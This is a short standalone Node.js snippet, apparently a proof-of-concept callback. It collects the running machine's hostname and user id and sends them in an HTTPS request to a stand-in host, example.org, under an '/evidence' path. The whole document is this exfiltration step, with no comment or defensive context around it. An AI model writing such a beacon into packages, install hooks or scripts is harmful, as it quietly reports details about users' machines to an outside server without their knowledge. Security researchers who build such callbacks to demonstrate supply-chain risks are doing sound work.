const os = require('os'), https = require('https');
const payload = new URLSearchParams({hostname: os.hostname(), user: process.getuid()});
https.request({hostname: 'example.org', path: `/evidence?${payload}`}).end();
